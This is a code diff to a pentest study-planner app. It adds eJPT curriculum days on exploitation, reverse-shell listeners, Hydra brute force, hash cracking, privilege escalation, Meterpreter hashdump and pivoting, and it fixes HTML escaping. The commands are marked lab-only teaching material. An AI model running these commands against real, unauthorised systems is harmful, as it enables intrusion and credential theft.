+    exit:"You can drive Metasploit end-to-end: search, configure, exploit, and obtain a session.",
+    concepts:["metasploit-basics"]}));
 
-  D.push(mk(14,"System security — Windows & Linux privilege escalation basics","System security & privesc intro","SUID, sudo -l, cron, unquoted service paths, weak permissions",
-    "Skim common Linux and Windows privesc checks.",
-    "On a lab VM: run manual Linux privesc checks (sudo -l, SUID, cron) and note any escalation path you can reason about.",
-    "TryHackMe/INE easy privesc lab VM","bash, find, sudo -l",
-    ["sudo -l on a lab VM","find / -perm -4000 2>/dev/null","Check crontab -l and /etc/crontab","Write down one plausible privesc path and why"],2.5,"High","Medium","System Security",["linux-services-cron"]));
+  D.push(mk({day:14, phase:"Host & Network Pentest", officialDomain:"Host & Network Penetration Testing",
+    title:"Exploitation & Gaining Initial Access",
+    topic:"Turning a vulnerability into a shell (with and without Metasploit)",
+    subtopics:"Reverse vs bind shells, listeners, manual public exploits, staged vs stageless payloads, stabilising a shell",
+    theory:"LEARN: reverse vs bind shells and how to run a manual exploit when MSF has no module. UNDERSTAND how to stabilise a raw shell.",
+    practical:"RUN: get a foothold two ways — via Metasploit and via a manual exploit. DOCUMENT: the full path each time.",
+    lab:"Deliberately vulnerable lab targets ONLY.",
+    tools:"nc, rlwrap, msfconsole, searchsploit, python",
+    commands:[
+      {c:"nc -lvnp 4444", note:"LAB ONLY — reverse-shell listener"},
+      {c:"rlwrap nc -lvnp 4444", note:"LAB ONLY — nicer interactive shell"},
+      {c:"python3 exploit.py <lab-target> <kali-ip> 4444", note:"LAB ONLY — run a reviewed manual exploit"},
+      {c:"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", note:"LAB ONLY — upgrade a dumb shell to a TTY"}
+    ],
+    tasks:[
+      "Explain reverse vs bind shells and when each is needed",
+      "Get a foothold on a lab host using Metasploit",
+      "Get a foothold using a manual (reviewed) public exploit",
+      "Stabilise a raw shell into a proper TTY",
+      "Document the full path (vuln -> exploit -> payload -> shell) for each"
+    ],
+    est:3, priority:"High", difficulty:"Medium",
+    exit:"You can gain and stabilise an initial foothold both via Metasploit and manually.",
+    concepts:["metasploit-basics","netcat-basics"]}));
 
-  D.push(mk(15,"Timed independent audit — no help allowed","Independent host & network audit","Full enumeration + basic exploitation of an unseen target within a time box",
-    "None — practical test day.",
-    "Pick a new easy INE/TryHackMe box. Set a 45-minute timer. Enumerate and attempt exploitation with ZERO outside help.",
-    "New, unseen easy box","nmap, Metasploit, ffuf/gobuster, netcat",
-    ["Set a 45-min timer before starting","Full enumeration + exploitation attempt, no external help","Stop exactly at 45 min, note where you got to","Write down what you'd do differently"],3,"High","Medium","Vulnerability Assessment",["independent-enumeration"]));
+  D.push(mk({day:15, phase:"Host & Network Pentest", officialDomain:"Host & Network Penetration Testing",
+    title:"Password Attacks & Cracking",
+    topic:"Brute forcing services and cracking captured hashes",
+    subtopics:"Online brute force (Hydra), offline cracking (John/Hashcat), hash identification, wordlists & rules, default creds",
+    theory:"LEARN: online vs offline attacks, how to identify a hash, and how to pick modes/wordlists. UNDERSTAND when brute force is worth it.",
+    practical:"RUN: brute-force a lab login and crack captured hashes. DOCUMENT: creds obtained and the method.",
+    lab:"Lab targets / captured lab hashes ONLY.",
+    tools:"hydra, john, hashcat, hash-identifier",
+    commands:[
+      {c:"hydra -l <user> -P rockyou.txt ssh://<lab-target>", note:"LAB ONLY — SSH brute force"},
+      {c:"hydra -L users.txt -P pass.txt <lab-target> http-post-form '<form>'", note:"LAB ONLY — web login brute force"},
+      {c:"hash-identifier   # or hashid <hash>", note:"Identify hash type"},
+      {c:"hashcat -m <mode> hashes.txt rockyou.txt", note:"LAB ONLY — crack captured hashes"},
+      {c:"john --wordlist=rockyou.txt hashes.txt", note:"LAB ONLY — crack with John"}
+    ],
+    tasks:[
+      "Identify the type of a captured hash",
+      "Brute-force an SSH or web login with Hydra",
+      "Crack captured hashes with Hashcat and John",
+      "Note why default/weak credentials are the most common finding",
+      "Record every credential obtained and how"
+    ],
+    est:2.5, priority:"High", difficulty:"Medium",
+    exit:"You can brute-force a service and crack captured hashes, recording usable credentials.",
+    concepts:["password-attacks","authentication-attacks"]}));
 
-  D.push(mk(16,"Report writing for eJPT-style findings","Report writing","Structuring findings, evidence, and remediation clearly",
-    "Skim a sample pentest finding write-up.",
-    "Write one full finding (title, description, evidence/screenshot placeholder, risk, remediation) for something you found this track.",
-    "Notes from Day 3-15","Notes app",
-    ["Pick one real finding from this track","Write title + description + evidence + risk + remediation","Keep it to one page, plain language"],2,"Medium","Easy","Exam Prep",["report-writing"]));
+  D.push(mk({day:16, phase:"Host & Network Pentest", officialDomain:"Host & Network Penetration Testing",
+    title:"Windows Privilege Escalation",
+    topic:"From a low-priv Windows shell to SYSTEM/admin",
+    subtopics:"whoami /priv, services & weak permissions, unquoted service paths, scheduled tasks, stored creds, token abuse, kernel exploits",
+    theory:"LEARN: the main Windows privesc vectors and how winPEAS surfaces them. UNDERSTAND how to pick the safest working vector.",
+    practical:"RUN: escalate on a vulnerable Windows lab VM. DOCUMENT: the working path.",
+    lab:"A deliberately vulnerable Windows lab VM ONLY.",
+    tools:"winPEAS, PowerShell, Metasploit (local_exploit_suggester)",
+    commands:[
+      {c:"whoami /priv ; whoami /groups", note:"LAB ONLY — privileges & groups"},
+      {c:"winPEASx64.exe > loot\\winpeas.txt", note:"LAB ONLY — automated privesc enum"},
+      {c:"sc qc <service> ; wmic service get name,pathname,startmode", note:"LAB ONLY — weak/unquoted services"},
+      {c:"run post/multi/recon/local_exploit_suggester", note:"LAB ONLY — MSF privesc suggester"}
+    ],
+    tasks:[
+      "Enumerate privileges/groups and run winPEAS",
+      "Check services for weak permissions and unquoted paths",
+      "Look for stored credentials and scheduled tasks",
+      "Escalate to admin/SYSTEM via at least one vector",
+      "Document the escalation path and why it worked"
+    ],
+    est:3, priority:"High", difficulty:"Hard",
+    exit:"You can escalate to SYSTEM/admin on a vulnerable Windows host and explain the vector.",
+    concepts:["windows-privesc"]}));
 
-  D.push(mk(17,"eJPT Readiness Assessment","Phase Assessment","Practical checkpoint before sitting the exam",
-    "Review your notes from Day 1-16 briefly.",
-    "Complete the readiness checklist below. Be honest — the exam is timed and open-book, but you still need methodology speed.",
-    "Any easy, previously unseen box","Full toolkit so far",
-    ["[ASSESSMENT] Enumerate an unknown host within 20 minutes","[ASSESSMENT] Identify and use a relevant Metasploit module unprompted","[ASSESSMENT] Explain TCP/IP + subnetting without notes","[ASSESSMENT] Run a basic web app attack (SQLi or XSS) unprompted","[ASSESSMENT] Write one clean finding in under 15 minutes","Mark PASS only if you did these with genuinely minimal hesitation"],2,"High","Hard","Exam Prep",[]));
+  D.push(mk({day:17, phase:"Host & Network Pentest", officialDomain:"Host & Network Penetration Testing",
+    title:"Linux Privilege Escalation",
+    topic:"From a low-priv Linux shell to root",
+    subtopics:"sudo -l, SUID/GUID, capabilities, cron, writable files/PATH, kernel exploits, stored credentials",
+    theory:"LEARN: the common Linux privesc vectors and how linpeas maps to them. UNDERSTAND how to reason to root methodically.",
+    practical:"RUN: escalate to root on a lab VM. DOCUMENT: the full path.",
+    lab:"A lab VM where you have a low-priv shell ONLY.",
+    tools:"linpeas, sudo, find, getcap, GTFOBins",
+    commands:[
+      {c:"sudo -l", note:"LAB ONLY — sudo rights (check GTFOBins)"},
+      {c:"find / -perm -4000 2>/dev/null", note:"LAB ONLY — SUID binaries"},
+      {c:"getcap -r / 2>/dev/null", note:"LAB ONLY — capabilities"},
+      {c:"./linpeas.sh | tee loot/linpeas.txt", note:"LAB ONLY — automated privesc enum"}
+    ],
+    tasks:[
+      "Check sudo rights and map them against GTFOBins",
+      "Enumerate SUID binaries and capabilities",
+      "Inspect cron jobs and writable files/PATH",
+      "Run linpeas and triage the top findings",
+      "Escalate to root and document the full path"
+    ],
+    est:3, priority:"High", difficulty:"Hard",
+    exit:"You can escalate to root on a vulnerable Linux host and document the path.",
+    concepts:["linux-privesc","linux-services-cron"]}));
+
+  D.push(mk({day:18, phase:"Host & Network Pentest", officialDomain:"Host & Network Penetration Testing",
+    title:"Post-Exploitation & Meterpreter",
+    topic:"What to do once you own a host",
+    subtopics:"Meterpreter core commands, hashdump, migrate, persistence concepts, looting, collecting network info for pivoting",
+    theory:"LEARN: Meterpreter's key commands and post-exploitation goals. UNDERSTAND how post-ex sets up pivoting to the rest of the network.",
+    practical:"RUN: post-exploit a lab host with Meterpreter and gather what you need to pivot. DOCUMENT: loot + newly discovered hosts/subnets.",
+    lab:"A lab host you own (Meterpreter session) ONLY.",
+    tools:"Meterpreter, Metasploit post modules",
+    commands:[
+      {c:"sysinfo ; getuid ; getprivs", note:"LAB ONLY — who/where am I"},
+      {c:"hashdump", note:"LAB ONLY — dump local hashes"},
+      {c:"run post/windows/gather/enum_logged_on_users", note:"LAB ONLY — gather users"},
+      {c:"ipconfig ; run post/multi/manage/autoroute", note:"LAB ONLY — find & route new subnets"}
+    ],
+    tasks:[
+      "Use core Meterpreter commands (sysinfo/getuid/getprivs)",
+      "Dump local hashes and loot useful files",
+      "Enumerate users and processes with post modules",
+      "Discover additional subnets/hosts reachable from this host",
+      "Record loot and the newly discovered internal network"
+    ],
+    est:2.5, priority:"High", difficulty:"Medium",
+    exit:"You can post-exploit a host with Meterpreter and identify what's reachable for pivoting.",
+    concepts:["post-exploitation"]}));
+
+  D.push(mk({day:19, phase:"Pivoting", officialDomain:"Host & Network Penetration Testing",
+    title:"Pivoting & Tunneling (exam-critical)",
+    topic:"Reaching hidden internal hosts through a compromised machine",
+    subtopics:"Why pivoting matters on the exam, Metasploit autoroute + socks proxy, proxychains, port forwarding, scanning through a pivot",
+    theory:"LEARN: how routing through a foothold reaches a second subnet, and the autoroute/socks/proxychains workflow. UNDERSTAND that many eJPT fails are missed pivots.",
+    practical:"RUN: pivot from a first host to a second internal host and enumerate it. DOCUMENT: the pivot chain.",
+    lab:"A multi-subnet lab where a second network sits behind your foothold ONLY.",
+    tools:"Metasploit (autoroute, socks_proxy), proxychains, ssh -L/-D, chisel",
+    commands:[
+      {c:"run autoroute -s <hidden-subnet>/24", note:"LAB ONLY — route MSF traffic via the foothold"},
+      {c:"use auxiliary/server/socks_proxy ; run", note:"LAB ONLY — start a SOCKS proxy"},
+      {c:"proxychains nmap -sT -Pn <second-host>", note:"LAB ONLY — scan through the pivot"},
+      {c:"ssh -D 1080 user@<foothold>   # then proxychains", note:"LAB ONLY — SSH dynamic port forward pivot"},
+      {c:"chisel client <kali>:8000 R:socks", note:"LAB ONLY — chisel reverse SOCKS pivot"}
+    ],
+    tasks:[
+      "Explain why pivoting is essential on the eJPT exam",
+      "Set up autoroute + a SOCKS proxy through your foothold",
+      "Scan a second-subnet host through the pivot with proxychains",
+      "Reach and enumerate at least one host you couldn't see directly",
+      "Document the full pivot chain (host A -> route -> host B)"
+    ],
+    est:3, priority:"High", difficulty:"Hard",
+    exit:"You can pivot through a compromised host to reach and enumerate a hidden internal subnet.",
+    prompt:"Pivoting trips up most eJPT candidates. Write the exact autoroute+proxychains steps as a checklist you can follow under exam pressure.",
+    concepts:["pivoting"]}));
+
+  D.push(mk({day:20, phase:"Exam Prep", officialDomain:"Integrated eJPT Assessment",
+    title:"eJPT Exam Simulation + Readiness Assessment",
+    topic:"A timed black-box network engagement, exam-style",
+    subtopics:"Full engagement across multiple hosts and subnets, pivoting, evidence capture, honest readiness scoring",
+    theory:"This is an assessment day. No walkthrough is provided — combine everything from Days 1-19 against an unseen multi-host network the way the real eJPT works (open-book, but you need methodology speed).",
+    practical:"SCENARIO: an authorised black-box network with multiple hosts, at least one hidden subnet behind a pivot, web and host services, and credentials to find. Work it end-to-end and answer exam-style questions about what you found. Figure out the path yourself.",
+    lab:"An authorised, previously unseen multi-host lab network (INE black-box lab, or an equivalent you have not solved). AUTHORISED ENVIRONMENTS ONLY.",
+    tools:"Everything from Days 1-19 (Nmap, Metasploit/Meterpreter, Hydra/Hashcat, ffuf/Burp, proxychains, linpeas/winPEAS)",
+    commands:[
+      {c:"# No commands given — you choose the right tool for each phase.", note:"Assessment: recall the workflow yourself"}
+    ],
+    tasks:[
+      "Scope + host discovery across the network",
+      "Full port/service enumeration on every host",
+      "Vulnerability identification and prioritisation",
+      "Initial access on a reachable host",
+      "Credential + network-info gathering (auditing domain)",
+      "Privilege escalation (Windows and/or Linux)",
+      "Pivot to a hidden subnet and compromise a host there",
+      "Answer exam-style questions from your evidence",
+      "[ASSESSMENT] You enumerated an unknown host within 20 minutes",
+      "[ASSESSMENT] You pivoted to a second subnet unaided",
+      "[ASSESSMENT] You used Metasploit + a manual method without hand-holding",
+      "Mark PASS only if you did these with genuinely minimal hesitation"
+    ],
+    est:6, priority:"High", difficulty:"Hard",
+    exit:"You complete an unseen multi-host, multi-subnet engagement (including a pivot) end-to-end and honestly assess exam readiness.",
+    prompt:"Treat this like the real exam: no hints. Note exactly where you hesitated — that's your revision list before booking.",
+    concepts:["enumeration-methodology","pivoting","report-writing"]}));
 
   return D;
 }
+
 
 /* =========================================================
    PJPT DAY PLAN — Practical Junior Penetration Tester (TCM Security).
@@ -1943,11 +2368,11 @@ let openDayId = null;
 
 function renderDaily(m){
   const track = state.meta.track;
-  const phaseLabel = track==='ejpt' ? 'eJPT exam-domain plan'
+  const phaseLabel = track==='ejpt' ? 'eJPT — 20-day exam-domain roadmap'
     : track==='pjpt' ? 'PJPT — first 20 days'
     : 'Phase 1: Foundations';
   const subNote = track==='ejpt'
-    ? "17 days aligned to the eJPT exam domains. Days marked with a concept badge overlap topics already covered on the OSCP track."
+    ? "Days 1-20 of the eJPTv2 track, weighted like the real exam across its 4 official domains: Assessment Methodologies (25%), Host & Network Auditing (25%), Host & Network Penetration Testing (35%) and Web Application Penetration Testing (15%). All commands are for your own isolated lab or explicitly authorised environments only. Days with a concept badge overlap topics already covered on another track."
     : track==='pjpt'
     ? "Days 1-20 of the Practical Junior Penetration Tester track, built from the official TCM PEH/PJPT areas. Prerequisite and supporting-skill days are labelled distinctly from official areas. All commands are for your own isolated lab or explicitly authorised environments only. Days with a concept badge overlap topics already covered on another track."
     : "21 days fully detailed. Later phases (Enumeration, Web Exploitation, AD, etc.) unlock and get generated once you're through this phase — this keeps the plan adaptive instead of a stale 300-row wall.";
@@ -2025,7 +2450,7 @@ function renderDayCard(d){
       <div class="day-field">
         <div class="fl">Commands <span style="color:var(--amber);font-weight:400;">(lab / authorised targets only)</span></div>
         <div class="cmd-block">
-          ${d.commands.map(c=>`<div class="cmd-row"><code>${escapeAttr(c.c)}</code>${c.note?`<span class="cmd-note">${c.note}</span>`:''}</div>`).join('')}
+          ${d.commands.map(c=>`<div class="cmd-row"><code>${escapeHtml(c.c)}</code>${c.note?`<span class="cmd-note">${escapeHtml(c.note)}</span>`:''}</div>`).join('')}
         </div>
       </div>`:''}
       <div class="day-field">
@@ -2233,6 +2658,13 @@ function renderCommands(){
   `;
 }
 function escapeAttr(s){ return (s||"").replace(/"/g,'&quot;'); }
+// Full HTML-escape for curriculum text rendered as element *content* (not an
+// attribute). Commands/notes routinely contain literal <, > and & (payload
+// examples, placeholders like <target-ip>) — without this, a string that
+// happens to start with "<script" etc. gets parsed as a real (inert) element
+// by the browser's innerHTML fragment parser and can swallow everything
+// rendered after it in the same update.
+function escapeHtml(s){ return (s||"").replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
 
 /* =========================================================
    WEAKNESS TRACKER
